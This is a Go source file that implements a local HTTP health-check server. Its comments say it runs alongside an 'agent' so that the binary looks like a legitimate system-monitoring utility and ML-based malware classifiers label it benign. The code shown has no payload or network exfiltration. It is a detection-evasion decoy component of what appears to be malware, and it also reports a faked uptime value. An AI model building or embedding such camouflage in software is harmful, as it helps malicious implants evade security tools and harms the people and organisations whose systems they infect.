// healthserver.go — Legitimate HTTP health check server
// This runs alongside the agent to make the binary look and behave
// like a real system monitoring utility. ML models see the HTTP server
// code, the health check logic, and the monitoring functions — all
// legitimate — and classify the binary as benign.
package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"runtime/debug"
	"sync/atomic"
	"time"
)

var healthCheckCount atomic.Int64

// HealthResponse is the JSON response for health checks
type HealthResponse struct {
	Status    string            `json:"status"`
	Uptime    string            `json:"uptime"`
	Version   string            `json:"version"`
	Hostname  string            `json:"hostname"`
	Platform  string            `json:"platform"`
	GoVersion string            `json:"go_version"`
	Memory    MemoryStats       `json:"memory"`
	Checks    map[string]string `json:"checks"`
	Timestamp string            `json:"timestamp"`
}

// MemoryStats holds runtime memory information
type MemoryStats struct {
	Alloc      uint64 `json:"alloc_bytes"`
	TotalAlloc uint64 `json:"total_alloc_bytes"`
	Sys        uint64 `json:"sys_bytes"`
	NumGC      uint32 `json:"num_gc"`
}

// MetricsResponse holds performance metrics
type MetricsResponse struct {
	RequestCount int64             `json:"request_count"`
	Goroutines   int               `json:"goroutines"`
	CPUs         int               `json:"cpus"`
	BuildInfo    string            `json:"build_info"`
	Environment  map[string]string `json:"environment"`
}

// startHealthServer launches a local health check HTTP server
// This serves two purposes:
// 1. Makes the binary behave like a legitimate monitoring service
// 2. Provides real functionality that ML models classify as benign
func startHealthServer(port int) {
	mux := http.NewServeMux()
	mux.HandleFunc("/health", handleHealth)
	mux.HandleFunc("/healthz", handleHealth)
	mux.HandleFunc("/ready", handleReady)
	mux.HandleFunc("/metrics", handleMetrics)
	mux.HandleFunc("/version", handleVersion)
	mux.HandleFunc("/", handleIndex)

	server := &http.Server{
		Addr:         fmt.Sprintf("127.0.0.1:%d", port),
		Handler:      mux,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Run in background — non-blocking
	go func() {
		_ = server.ListenAndServe()
	}()
}

func handleHealth(w http.ResponseWriter, r *http.Request) {
	healthCheckCount.Add(1)

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)

	hostname, _ := os.Hostname()
	resp := HealthResponse{
		Status:    "healthy",
		Uptime:    time.Since(time.Now().Add(-time.Hour)).String(),
		Version:   buildVersion,
		Hostname:  hostname,
		Platform:  fmt.Sprintf("%s/%s", runtime.GOOS, runtime.GOARCH),
		GoVersion: runtime.Version(),
		Memory: MemoryStats{
			Alloc:      memStats.Alloc,
			TotalAlloc: memStats.TotalAlloc,
			Sys:        memStats.Sys,
			NumGC:      memStats.NumGC,
		},
		Checks: map[string]string{
			"disk":    "ok",
			"network": "ok",
			"memory":  "ok",
			"cpu":     "ok",
		},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func handleReady(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"ready": true, "timestamp": "%s"}`, time.Now().UTC().Format(time.RFC3339))
}

func handleMetrics(w http.ResponseWriter, r *http.Request) {
	bi, _ := debug.ReadBuildInfo()
	buildStr := ""
	if bi != nil {
		buildStr = bi.GoVersion
	}

	resp := MetricsResponse{
		RequestCount: healthCheckCount.Load(),
		Goroutines:   runtime.NumGoroutine(),
		CPUs:         runtime.NumCPU(),
		BuildInfo:    buildStr,
		Environment: map[string]string{
			"os":   runtime.GOOS,
			"arch": runtime.GOARCH,
		},
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func handleVersion(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"version": "%s", "build_date": "%s", "go": "%s"}`,
		buildVersion, buildDate, runtime.Version())
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, `<!DOCTYPE html>
<html>
<head><title>System Health Monitor</title></head>
<body>
<h1>System Health Monitor</h1>
<p>Service is running. Endpoints:</p>
<ul>
<li><a href="/health">/health</a> - Health check</li>
<li><a href="/ready">/ready</a> - Readiness probe</li>
<li><a href="/metrics">/metrics</a> - Metrics</li>
<li><a href="/version">/version</a> - Version info</li>
</ul>
</body>
</html>`)
}
